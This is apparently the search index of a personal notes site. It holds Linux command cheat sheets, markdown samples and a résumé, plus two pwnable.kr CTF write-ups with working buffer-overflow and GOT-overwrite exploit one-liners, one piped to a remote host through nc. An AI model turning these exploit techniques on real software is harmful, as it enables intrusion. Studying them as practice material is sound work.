{
  "0": {
    "title": "",
    "content": "404 . Page not found :( . The requested page could not be found. .",
    "url": "http://localhost:4000/_notes/404.html",
    "relUrl": "/404.html"
  },
  "1": {
    "title": "IO_redirection",
    "content": "I/O Redirection . input/output types . IO Name file descriptor . stdin | 0 | . stdout | 1 | . stderr | 2 | . Redirection . &gt; Redirects standard output to a file. Overwrites (truncating) existing contents. | &gt;&gt; Redirects standard output to a file. Appends to any existing contents. | &lt; Redirects input from a file to a command. | &amp; Used with redirection to signal that a file descriptor is being used. | 2&gt;&amp;1 Combine stderr and standard output. | 2&gt;file Redirect standard error to a file. ls file.txt not-here 2 &gt; out.err | . combine 1 &amp; 2 output ls file.txt not-here &gt; out.both 2 &gt; &amp;1 . The Null Device . &gt; /dev/null Redirect output to nowhere. | .",
    "url": "http://localhost:4000/_notes/docs/linux/IO_redirection.html",
    "relUrl": "/docs/linux/IO_redirection.html"
  },
  "2": {
    "title": "About me",
    "content": "This Page is for noting something I occurred included IT, traveling and something I feel interested. . about me . Jerry Huang | Chinese Name:黃建智 | IT engineer | . specialize: . .NET | Python | Javascript | WEB Stack | IOT | .",
    "url": "http://localhost:4000/_notes/about/",
    "relUrl": "/about/"
  },
  "3": {
    "title": "file_manipulate",
    "content": "Removing Files . rm file Remove file. | rm -r dir Remove the directory and its contents recursively. | rm -f file Force removal and never prompt for confirmation. | . copy . cp source_file destination_file Copy source_file to destination_file. . | cp src_file1 [src_fileN …] dest_dir Copy source_files to destination_directory. . | . Moving and Renaming Files . mv source destination | mv -i source destination | . Creating a Collection of Files . tar [-] c|x|t f tarfile [pattern] Create, extract or list contents of a tar archive using pattern, if supplied. . | tar Options | . options   . c | Create a tar archive. | . x | Extract files from the archive. | . t | Display the table of contents (list). | . v | Be verbose. | . z | Use compression. | . f | file Use this file. | . Disk Usage . du Estimates file usage. | du -k Display sizes in Kilobytes. | du -h Display sizes in human readable format. | . Comparing Files . diff file1 file2 Compare two files. | sdiff file1 file2 Side-by-side comparison. | vimdiff file1 file2 Highlight differences in vim. | .",
    "url": "http://localhost:4000/_notes/docs/linux/file_manipulate.html",
    "relUrl": "/docs/linux/file_manipulate.html"
  },
  "4": {
    "title": "grep_command",
    "content": "Grep Command . grep Display lines matching a pattern. | grep pattern file | . -i Perform a search, ignoring case. -c Count the number of occurrences in a file. -n Precede output with line numbers. -v Invert Match. Print lines that don’t match. . The file Command . file file_name Display the file type . $ file sales.data sales.data: ASCII text $ file * bin: directory jason.tar: POSIX tar archive . Searching for Text in Binary Files . strings Display printable strings. . Pipes . | Pipe symbol | command-output | command-input | . | . grep pattern file cat file | grep pattern . The cut Command . -cut [file] . Cut out selected portions of file. If file is omitted, use standard input. . -d delimiter Use delimiter as the field separator. -f N Display the Nth field. . sample code . grep bob /etc/passwd | cut -d: -f 1,5 | sort | tr &quot;:&quot; &quot; &quot; | column -t .",
    "url": "http://localhost:4000/_notes/docs/linux/grep_command.html",
    "relUrl": "/docs/linux/grep_command.html"
  },
  "5": {
    "title": "ide-tools",
    "content": "開發工具 . 紀錄常用快捷列 | 紀錄設定 | .",
    "url": "http://localhost:4000/_notes/docs/ide-tools",
    "relUrl": "/docs/ide-tools"
  },
  "6": {
    "title": "",
    "content": "",
    "url": "http://localhost:4000/_notes/",
    "relUrl": "/"
  },
  "7": {
    "title": "linux",
    "content": "linux . linux administrator commands | linux shellscript | .",
    "url": "http://localhost:4000/_notes/docs/linux",
    "relUrl": "/docs/linux"
  },
  "8": {
    "title": "linux_basic_command",
    "content": "ls options . -a List all files, including hidden files. | –color List files with colorized output. | -d List directory names, not contents. | -l Use the long listing format. | -r Reverse the order. | -R List files recursively. | -t Sort by time, most recent first. | . Permission Explained . ||U|G|O| |-|-|-|-| |Symbolic| rwx| r-x| r–| |Binary| 111| 101 |100| |Decimal| 7| 5 |4| . The find and locate Command . find [path…] [expression] . -name pattern Find files and directories that match pattern. | -iname pattern Like -name, but ignores case. | -ls Performs an ls on each of the found items | -mtime days Finds files that are days old. | -size num Finds file that are of size num. | -newer file Finds files that are newer than file. | .",
    "url": "http://localhost:4000/_notes/docs/linux/linux_basic_command.html",
    "relUrl": "/docs/linux/linux_basic_command.html"
  },
  "9": {
    "title": "markdown_sample",
    "content": "Href Link . [這是一個行內連結](https://www.google.com) [這是一個帶有標題的行內連結](https://www.google.com &quot;Google&#39;s Homepage&quot;) [這是一個參考連結][Arbitrary case-insensitive reference text] [這是一個對應到 Git 倉儲檔案的相對參考連結](../blob/master/LICENSE) [參考標的物也可以使用數字][1] 直接使用文字對應也可以 [這段文字連到參考項目] 參考項目可以寫在文檔的最後，有點像書內的註解（註腳）。 [arbitrary case-insensitive reference text]: https://www.mozilla.org [1]: http://slashdot.org [這段文字連到參考項目]: http://www.reddit.com . 這是一個行內連結 . 這是一個帶有標題的行內連結 . 這是一個參考連結 . 這是一個對應到 Git 倉儲檔案的相對參考連結 . 參考標的物也可以使用數字 . 直接使用文字對應也可以 這段文字連到參考項目 . 參考項目可以寫在文檔的最後，有點像書內的註解（註腳）。 . I get 10 times more traffic from [Google][] than from [Yahoo][] or [MSN][]. [google]: http://google.com/ &quot;Google&quot; [yahoo]: http://search.yahoo.com/ &quot;Yahoo Search&quot; [msn]: http://search.msn.com/ &quot;MSN Search&quot; . I get 10 times more traffic from Google than from Yahoo or MSN. . &lt;http://example.com/&gt; . http://example.com/ — . stronger . *single asterisks* _single underscores_ **double asterisks** __double underscores__ . single asterisks . single underscores . double asterisks . double underscores . . Code . Use the printf() function. . Youtube Link . &lt;a href=&quot;http://www.youtube.com/watch?feature=player_embedded&amp;v=YOUTUBE_VIDEO_ID_HERE &quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg&quot; alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt; [![IMAGE ALT TEXT HERE](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE) . . .",
    "url": "http://localhost:4000/_notes/docs/markdown/markdownsample.html",
    "relUrl": "/docs/markdown/markdownsample.html"
  },
  "10": {
    "title": "markdown",
    "content": "markdwon . 基礎語法 | 範本 | .",
    "url": "http://localhost:4000/_notes/docs/markdown",
    "relUrl": "/docs/markdown"
  },
  "11": {
    "title": "pentrue-test",
    "content": "pentrue-test . something about pt and fuzzy practice .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test",
    "relUrl": "/docs/pentrue-test"
  },
  "12": {
    "title": "pwnable_bof",
    "content": "pwnable bof . Source : . pwnable.kr . fuzzy 模糊字串產生方便debug . import string import random def id_generator(size=6, chars=string.ascii_uppercase + string.digits): return &#39;&#39;.join(random.choice(chars) for _ in range(size)) . | . 執行結果 . id_generator() . ‘G5G74W’ . id_generator(3, “6793YUIO”) . ‘Y3U’ . 程式原始碼 . #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah.. n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } . smash me! | if(key == 0xcafebabe)…… | 觀察key的位址直接修改 | . . solution . #debug python -c &quot;print &#39;A&#39;*52+&#39; xbe xba xfe xca&#39;&quot; &gt; input.txt #gdb r &lt; input.txt #nc pwnable.kr 9000 #keep stding with python cat &lt;(python -c &quot;print &#39;A&#39;*52+&#39; xbe xba xfe xca&#39;&quot;) - | nc pwnable.kr 9000 .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test/pwnable%20bof.html",
    "relUrl": "/docs/pentrue-test/pwnable%20bof.html"
  },
  "13": {
    "title": "pwnable_passout_code",
    "content": "pwnable pass code . Source : . pwnable.kr | gcc stack protection | gcc stack protection2 | linux got | linux got . 程式原始碼 . | . #include &lt;stdio.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking... n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK! n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed! n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s! n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta. n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :) n&quot;); return 0; } . . solution . 查got表 . passcode@ubuntu:~$ readelf -r passcode Relocation section &#39;.rel.dyn&#39; at offset 0x388 contains 2 entries: Offset Info Type Sym.Value Sym. Name 08049ff0 00000606 R_386_GLOB_DAT 00000000 __gmon_start__ 0804a02c 00000b05 R_386_COPY 0804a02c stdin@GLIBC_2.0 Relocation section &#39;.rel.plt&#39; at offset 0x398 contains 9 entries: Offset Info Type Sym.Value Sym. Name 0804a000 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 ##使用這個位址 0804a004 00000207 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a008 00000307 R_386_JUMP_SLOT 00000000 __stack_chk_fail@GLIBC_2.4 0804a00c 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a010 00000507 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a014 00000607 R_386_JUMP_SLOT 00000000 __gmon_start__ 0804a018 00000707 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a01c 00000807 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a020 00000907 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 . disas login . 查完之後會發現scanf前的地址-0x10(%ebp) 剛好在’a’*96的後四位… gef➤ x/x $ebp -0x10 0xffffcff8: 0x0804a010 . | 將位址替換成fflush | scanf %d 0x080485e3(134514147),此處使很關鍵的地方表示fflush會被替換成 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) | ‘ n’ 應該表示是字串結尾 0xffffcff0: 0x61616161 0x61616161 0x0804a010 0x4ff54700 0xffffd000: 0x08048800 0xffffd0c4 0xffffd018 0x080486e0 0xffffd010: 0xf7fb23dc 0xffffd030 0x00000000 0xf7e18637 0xffffd020: 0xf7fb2000 0xf7fb2000 0x00000000 0xf7e18637 0xffffd030: 0x00000001 0xffffd0c4 0xffffd0cc 0x00000000 0xffffd040: 0x00000000 0x00000000 0xf7fb2000 0xf7ffdc04 0xffffd050: 0xf7ffd000 0x00000000 0xf7fb2000 0xf7fb2000 0xffffd060: 0x00000000 0xab31c77d 0x979a496d 0x00000000 . (gdb) disas login Dump of assembler code for function login: 0x08048564 &lt;+0&gt;: push %ebp 0x08048565 &lt;+1&gt;: mov %esp,%ebp 0x08048567 &lt;+3&gt;: sub $0x28,%esp 0x0804856a &lt;+6&gt;: mov $0x8048770,%eax 0x0804856f &lt;+11&gt;: mov %eax,(%esp) 0x08048572 &lt;+14&gt;: call 0x8048420 &lt;printf@plt&gt; 0x08048577 &lt;+19&gt;: mov $0x8048783,%eax 0x0804857c &lt;+24&gt;: mov -0x10(%ebp),%edx 0x0804857f &lt;+27&gt;: mov %edx,0x4(%esp) 0x08048583 &lt;+31&gt;: mov %eax,(%esp) 0x08048586 &lt;+34&gt;: call 0x80484a0 0x0804858b &lt;+39&gt;: mov 0x804a02c,%eax 0x08048590 &lt;+44&gt;: mov %eax,(%esp) 0x08048593 &lt;+47&gt;: call 0x8048430 &lt;fflush@plt&gt; 0x08048598 &lt;+52&gt;: mov $0x8048786,%eax 0x0804859d &lt;+57&gt;: mov %eax,(%esp) 0x080485a0 &lt;+60&gt;: call 0x8048420 &lt;printf@plt&gt; 0x080485a5 &lt;+65&gt;: mov $0x8048783,%eax 0x080485aa &lt;+70&gt;: mov -0xc(%ebp),%edx 0x080485ad &lt;+73&gt;: mov %edx,0x4(%esp) 0x080485b1 &lt;+77&gt;: mov %eax,(%esp) 0x080485b4 &lt;+80&gt;: call 0x80484a0 0x080485b9 &lt;+85&gt;: movl $0x8048799,(%esp) 0x080485c0 &lt;+92&gt;: call 0x8048450 &lt;puts@plt&gt; 0x080485c5 &lt;+97&gt;: cmpl $0x528e6,-0x10(%ebp) 0x080485cc &lt;+104&gt;: jne 0x80485f1 &lt;login+141&gt; 0x080485ce &lt;+106&gt;: cmpl $0xcc07c9,-0xc(%ebp) 0x080485d5 &lt;+113&gt;: jne 0x80485f1 &lt;login+141&gt; 0x080485d7 &lt;+115&gt;: movl $0x80487a5,(%esp) 0x080485de &lt;+122&gt;: call 0x8048450 &lt;puts@plt&gt; ##調用system ## 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) ## 0x080485ea &lt;+134&gt;: call 0x8048460 &lt;system@plt&gt; 0x080485ef &lt;+139&gt;: leave 0x080485f0 &lt;+140&gt;: ret 0x080485f1 &lt;+141&gt;: movl $0x80487bd,(%esp) 0x080485f8 &lt;+148&gt;: call 0x8048450 &lt;puts@plt&gt; 0x080485fd &lt;+153&gt;: movl $0x0,(%esp) 0x08048604 &lt;+160&gt;: call 0x8048480 &lt;exit@plt&gt; End of assembler dump. . print int(&quot;0x080485e3&quot;, 0) 134514147 python -c &quot;print (&#39;a&#39;*96+&#39; x04 xa0 x04 x08&#39;+&#39; n&#39;+&#39;134514147 n&#39;)&quot; | ./passcode . ### localtest . | . 0x80485bc &lt;login+33&gt; call 0x8048480 &lt;__isoc99_scanf@plt&gt; 0x80485c1 &lt;login+38&gt; add esp, 0x10 0x80485c4 &lt;login+41&gt; mov eax, ds:0x804a040 0x80485c9 &lt;login+46&gt; sub esp, 0xc 0x80485cc &lt;login+49&gt; push eax → 0x80485cd &lt;login+50&gt; call 0x8048420 &lt;fflush@plt&gt; ＃call 0x080485e3 ↳ 0x8048420 &lt;fflush@plt+0&gt; jmp DWORD PTR ds:0x804a010 0x8048426 &lt;fflush@plt+6&gt; push 0x8 0x804842b &lt;fflush@plt+11&gt; jmp 0x8048400 0x8048430 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a014 0x8048436 &lt;__stack_chk_fail@plt+6&gt; push 0x10 0x804843b &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048400 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]──── [#0] Id 1, Name: &quot;passcode&quot;, stopped, reason: SINGLE STEP ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]──── [#0] 0x80485cd → Name: login() [#1] 0x80486e0 → Name: main() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ n [New process 25845] process 25845 is executing new program: /bin/dash Error in re-setting breakpoint 1: Function &quot;login&quot; not defined. [New process 25846] process 25846 is executing new program: /bin/cat lfagqqqqqq!!!! n [Inferior 3 (process 25846) exited normally] enter passcode1 : Now I can safely trust you that you have credential :) [*] No debugging session active gef➤ .",
    "url": "http://localhost:4000/_notes/docs/pentrue-test/pwnable%20pass%20out%20code.html",
    "relUrl": "/docs/pentrue-test/pwnable%20pass%20out%20code.html"
  },
  "14": {
    "title": "vscode short cut",
    "content": "Visual studio Core 快捷 . 行操作 . ALT + 上 或 ALT + 下 快速移動一整行 | SHIFT + ALT + down 複製一行 | CTRL+SHIFT+k 刪除一行 | CTRL + X 刪除目前行 | SHIFT + ALT + ↓ 複製此行到下一行 | . 快速選擇 . CTRL + F2 選取所有相同的名稱 | ALT + mouse click 多重選擇 | CTRL + SHIFT + 左右方向鍵 一次移動多選取一個單詞 | SHIFT + 上下方向鍵 上下移動選取區塊 | 搜尋 . | CTRL+SHIFT+F 在檔案中尋找 | . 其他 . F8 依序查看警告訊息 | ALT + F12 查看定義 | CTRL + k, CTRL+0 摺疊 | CTRL + n 分割視窗 | .",
    "url": "http://localhost:4000/_notes/docs/ide-tools/vs_core_shortcut.html",
    "relUrl": "/docs/ide-tools/vs_core_shortcut.html"
  },
  "15": {
    "title": "wildcard",
    "content": "WildCard . matches zero or more characters. *.txt a* a*.txt . | ? - matches exactly one character. ?.txt a? a?.txt . | [] - A character class. Matches any of the characters included between the brackets. Matches exactly one character. [aeiou] ca[nt]* can cat candy catch . | [!] - Matches any of the characters NOT included between the brackets. Matches exactly one character. [!aeiou]* baseball cricket . | More Wildcards - Ranges Use two characters separated by a hyphen to create a range in a character class [a-g]* Matches all files that start with a, b, c, d, e, f, or g. [3-6]* Matches all files that start with 3, 4, 5 or 6. . | .",
    "url": "http://localhost:4000/_notes/docs/linux/wildcard.html",
    "relUrl": "/docs/linux/wildcard.html"
  },
  "16": {
    "title": "work",
    "content": "一些曾經做過的專案 .",
    "url": "http://localhost:4000/_notes/docs/work",
    "relUrl": "/docs/work"
  },
  "17": {
    "title": "work_Chinese",
    "content": "開發系統簡介資料 . 1.憑證驗證 . 為了整合國軍智慧卡驗證機制，針對國軍客製化智慧卡進行驗證程序設計，用戶端將智慧卡插入讀卡機後，透過憑證驗證程式，輸入PinCode後進行第一階段驗證，當PinCode驗證完成後，進入卡片讀取簽章憑證資訊並驗證其校期，再來由驗證伺服至LDAP取出身份識別，並將憑證序號送入MCA進行驗證，檢查該張憑證是否有效。 . 2.Reserving and Pentesting . 針對反組譯及ShellCode撰寫如圖2-1，藉此熟悉組合語言並僚解底層運作原理，後續並利用編碼方式測試防毒軟體偵測及ShellCode規避能力。 . 3.員額報表系統 . 配合人事部門開發，使用WPF、MVC及Restful架構，並結合OneTimeToken產製、憑證驗證。開發工項包含報表60種、帳號管理、角色權限管理，輸入及參數設定，開發時間約1年，現為人事核心系統。 其中在每日員額統計使用樹狀圖顯示所有單位，並提供使用者勾選後，查找子單位及併計單位總量的功能，在開發時初期使用遞歸方式，在後續分析後，發現大量查找時出現效能瓶頸，遞歸過程中出現大量重複運算，後續利用動態規劃減少計算量後，成功解決問題。 . 4.電腦資產管控及視覺化 . 配合單位重新佈署作業系統，於作業系統內部署回報程式，使單位可掌握目前作業系統安裝狀況，並結合資產、網管及回報系統資料庫同步及排程回饋，利用圖表視覺化顯示相關資訊。 . 5.災害防救資訊系統發展 . 因救災任務順遂，105年時開發「災害防救資訊系統」，整合內政部TGOS救災圖層資訊、GoogleMapAPI、SignalR，Client使用Android行動裝置。 . 6.線上歸鄉報到 . 撰寫離營歸鄉報到系統，107年時完成與內政部資訊系統構連，節省離退人員往返市區公所報到時間。 . 7.補繳年資系統 . 整合公務人員退休撫卹基金會，107年時開發國軍購買年資系統，完成8萬人補繳工程…整個開發及測試時間嚴重壓縮，幸運的最後平安結束，自己也被扣了4萬多Ｏrz。 . 8.其他開發項目 . 由於單位關係…很多東西連畫面都沒辦法截…只能列表 . :closed_book: 系統開發項目 . 軍人保險計算查詢系統 | 志願役士兵起役系統 | 單位門戶網站含後台 | 代碼查詢系統 | SyBase拓樸查詢系統 | 國軍軟體管理資訊系統 | 門戶網站仿WebDesktop | 退除役資料交換Web服務 | 驗證碼產生WebService | 問卷調查系統 | . :closed_book: 系統維護項目 . 人事資訊系統(7個子系統) | 人事查詢系統(5個子系統) | 人事線傳系統 | 出國管制系統 | 考核系統 | StorePreduce（大量數千行）、CronJob多隻 | 體能鑑測、CA憑證、人員查詢、門禁WebService | 財產抽籤系統 | . 自我學習與受訓課程（ＭＯＯＣ） . 對於新知識充滿熱情，強迫症般的利用下班時間不斷學習，加強自身不足，相信很快能適應或符合團隊需求。 . 類別 名稱 課程來源 講師 備考 . Data Science | Neural Networks and Deep Learning | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Improving Deep Neural Networks | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Structured Machine Learning Projects | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Convolutional Neural Networks | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Sequence Models | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Machine Learning | Coursera | Standford Andrew Ng | 自行學習 | .   | Artificial Intelligence A-Z™: Learn How To Build An AI | Udemy | Hadelin de Ponteves | 自行學習 | .   | Deep Learning A-Z™: Hands-On Artificial Neural Networks | Udemy | Kirill Eremenko | 自行學習 | .   | Apache Hadoop之開發者訓練課程 | 恆毅資訊 | 潘家羲 Sparrow Pan | 公司派訓 | .   | 机器学习 A-Z (Machine Learning A-Z in Chinese) | Udemy | Hadelin de Ponteves | 自行學習 | .   | Data Science and Machine Learning for Infosec | Pentester Academy | Sinan Ozdemir | 自行學習 | .   | D3.js資料視覺化 | 國發會 | 巨匠電腦講師 | 公司派訓 | .   | Building Recommender Systems with Machine Learning and AI |   | Sundog Education by Frank Kane | 自行學習 | .   | Machine Learning with Javascript |   | Stephen Grider, Engineering Architect | 自行學習 | .   | Artificial Intelligence 2018: Build the Most Powerful AI |   | Hadelin de Ponteves, AI Entrepreneur | 自行學習 | .   | Machine Learning Practical: 6 Real-World Applications |   | Kirill Eremenko, Data Scientist | 自行學習 | .   | Deep Learning and Computer Vision A-Z™: OpenCV, SSD &amp; GANs |   | Hadelin de Ponteves, AI Entrepreneur | 自行學習 | .   | Tableau 10 A-Z: Hands-On Tableau Training For Data Science |   | Kirill Eremenko, Data Scientist | 自行學習 | . Security | Python for Pentesters | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | x86 Assembly Language and Shellcoding on Linux | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Javascript for Pentesters | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Pentesting with Metasploit | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Wi-Fi Security and Pentesting | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Exploiting Simple Buffer Overflows on Win32 | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | GNU Debugger Megaprimer | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Web Application Pentesting | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Network Pentesting | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Reverse Engineering and Exploit Development | Udemy | Infinite Skills Dr.Philip Polstra | 自行學習 | .   | Kali Linux:Learn The Complete Hacking Operating System | Udemy | Sunil K. Gupta | 自行學習 | .   | Advanced Ethical Hacking | Udemy | VTCSoftware Training | 自行學習 | .   | The Complete Cyber Security Course : Hackers Exposed | Udemy | Nathan House | 自行學習 | .   | The Complete Nmap Ethical Hacking Course : Network Security | Udemy | Nathan House | 自行學習 | .   | The Complete Cyber Security Course : Network Security | Udemy | Nathan House | 自行學習 | .   | The Complete Cyber Security Course : End Point Protection | Udemy | Nathan House | 自行學習 | .   | Learn Social Engineering From Scratch | Udemy | Zaid Sabih | 自行學習 | .   | Website Hacking in Practice | Udemy | Hacking School | 自行學習 | .   | The Complete Cyber Security Course : Anonymous Browsing | Udemy | Nathan House | 自行學習 | .   | SSCP資安專業人員認證課程 | 恆毅資訊 | 唐任威 Vincent_tang | 公司派訓 | . 程式開發 | JavaScript 全攻略：克服 JS 的奇怪部分 | Udemy | 慕課 | 自行學習 | .   | JavaScript Design Patterns: 20 Patterns for Expert Code | Udemy | Packt Publishing | 自行學習 | .   | A Simple Node.js Mongo Restify API in Less Than 3 Hours | Udemy | Jim Hlad | 自行學習 | .   | Learning Windows PowerShell | Udemy | Infinite Skills | 自行學習 | .   | C# Developers: Learn the Art of Writing Clean Code | Udemy | Mosh Hamedani | 自行學習 | .   | Red Hat程式設計 | 恆毅資訊 | 王俊城Anderson Wang | 公司派訓 | .   | Andriod程式設計 | 恆毅資訊 | 何孟翰 Mark Ho | 公司派訓 | .   | Linux系統管理 | 國發會 | 林國龍 Bill Lin | 公司派訓 | .   | Vue.js Essentials - 3 Course Bundle |   | Anthony Gore, Vue Community Partner | 自行學習 | .   | 動畫互動網頁特效入門（JS/CANVAS |   | hahow 吳哲宇 | 自行學習 | . 其他 | Number Theory | Udemy | Miran Fattah | 自行學習 | .   | 微積分-導函數篇、極限篇、基礎數學篇 | Udemy | Lee Bor-Jian | 自行學習 | .   | Python for Data Structures, Algorithms, and Interviews | Udemy | Jose Portilla | 自行學習 | .   | BlockchainBasics:Practical Approach | Udemy | Toshendra Sharma | 自行學習 | .   | 算法基礎 | Coursera | Peking Universary | 自行學習 | .   | 數據結構基礎 | Coursera | Peking Universary | 自行學習 | .   | 工程數學-線性代數 | 台大開放式課程 | 蘇柏青 | 自行學習 | .   | JavaScript Algorithms and Data Structures Masterclass |   | Colt Steele | 自行學習 | .   | Elasticsearch 6 and Elastic Stack - In Depth and Hands On |   | Sundog Education by Frank Kane | 自行學習 | .   | Blockchain A-Z™: Learn How To Build Your First Blockchain |   | Hadelin de Ponteves, AI Entrepreneur | 自行學習 | .   | 用 Python 理財：打造小資族選股策略 |   | hahow FinLab | 自行學習 | .",
    "url": "http://localhost:4000/_notes/docs/work/work_Chinese.html",
    "relUrl": "/docs/work/work_Chinese.html"
  },
  "18": {
    "title": "work_Eng",
    "content": "Brief About Me. . 1.Certificate Authorize . In order to integrate the military smart card verification mechanism, the verification program is designed for the national military customized smart card. After the user inserts the smart card into the card reader, the certificate verification program is used to enter the PinCode and then do the first stage verification. When the PinCode is verified, After completion, enter the card to read the signature information and verify, then the verification send to the LDAP to retrieve the identity, and send the serial number to the MCA for validation and check. . 2.Reserving and Pentesting . For the Reserving and ShellCode, as shown in Figure 2-1, familiarize low-level computer language, and then use the encoding method to test the anti-virus detection and ShellCode evasion ability. . 3.Human Resource Report System . Developed with the Human Resource department, using WPF, MVC and Http Restful architecture, combined with JustOneTimeToken validation. The development project includes more than 60 reports, and the development time is about 1 year. It is a core system now. In statistic’s case, all the units are displayed in a tree view, and the function of finding the sub-units and the total amount of the units after the user check. The recursive method is used at the initial stage of development and there is a performance bottleneck, a large number of repeated operations occur in the recursive process. At last, we use the dynamic plan to reduce the amount of calculation and the problem is solved successfully. . 4.IT Fcilities Resource Visualization . Cooperate with another divion to count re-install the computer’s operating system, so that it can grasp the current system installation status, and combine the assets, network management and reporting system database synchronization and scheduling feedback, and use the chart to visually display relevant information. . 5.Military Rescue System . For military’s rescue mission, the “Disaster Prevention Information System” was developed in 2016, integrating the TGOS disaster relief layer information of the Ministry of the Interior. This project intergate with GoogleMapAPI, SignalR, and need to develpoe the Android application. . 6.Reserve Soldier Registration System . The Reserve Soldier Registration System is developed in 2018,it save a lot of time for the reserve soldier register when they retire. . 7.Redemption of Ｗorking Years System . In 2018, I develop this system integrate with the Civil Service Retirement Pension Foundation to Calculate over 80,000 people’s payment for redemption. The entire development and testing time was severely compressed. it only 2 week for developing and one week for testing. Finally, it ended successfully and got good reaction. . 8.Another Project . Because of Military secret deal, only list the systems. . :closed_book: Developing . Military Insurance Calculation and Querying System | Volunteer soldiers starting system | Unit portal with background | Code query system | SyBase topology query system | National Army Software Management Information System | Portal imitation WebDesktop | Retirement data exchange web service | Verification code generates WebService | Questionnaire system | . :closed_book: Maintain . Personnel Information System (7 subsystems) | Personnel inquiry system (5 subsystems) | Personnel transmission system | Going abroad control system | Assessment system | StorePreduce (a large number of thousands of lines), CronJob multiple | Physical assessment, CA certificate, personnel query, access control WebService | Property Lottery System | . Self learning and mooc . Enthusiastic about knowledge,continuously learning after working time. . Category CalssName Course source lecturer Memo . Data Science | Neural Networks and Deep Learning | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Improving Deep Neural Networks | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Structured Machine Learning Projects | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Convolutional Neural Networks | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Sequence Models | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Machine Learning | Coursera | Standford Andrew Ng | self-Learn | .   | Artificial Intelligence A-Z™: Learn How To Build An AI | Udemy | Hadelin de Ponteves | self-Learn | .   | Deep Learning A-Z™: Hands-On Artificial Neural Networks | Udemy | Kirill Eremenko | self-Learn | .   | Apache Hadoop of Development training | 恆毅資訊 | 潘家羲 Sparrow Pan | company-training | .   | MachineLearning A-Z (Machine Learning A-Z in Chinese) | Udemy | Hadelin de Ponteves | self-Learn | .   | Data Science and Machine Learning for Infosec | Pentester Academy | Sinan Ozdemir | self-Learn | .   | D3.js Visualiztion | 國發會 | 巨匠電腦講師 | company-training | .   | Building Recommender Systems with Machine Learning and AI |   | Sundog Education by Frank Kane | self-Learn | .   | Machine Learning with Javascript |   | Stephen Grider, Engineering Architect | self-Learn | .   | Artificial Intelligence 2018: Build the Most Powerful AI |   | Hadelin de Ponteves, AI Entrepreneur | self-Learn | .   | Machine Learning Practical: 6 Real-World Applications |   | Kirill Eremenko, Data Scientist | self-Learn | .   | Deep Learning and Computer Vision A-Z™: OpenCV, SSD &amp; GANs |   | Hadelin de Ponteves, AI Entrepreneur | self-Learn | .   | Tableau 10 A-Z: Hands-On Tableau Training For Data Science |   | Kirill Eremenko, Data Scientist | self-Learn | . Security | Python for Pentesters | Pentester Academy | Vivek Ramachandran | self-Learn | .   | x86 Assembly Language and Shellcoding on Linux | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Javascript for Pentesters | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Pentesting with Metasploit | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Wi-Fi Security and Pentesting | Pentester Academy | Vivek Ramachandran | 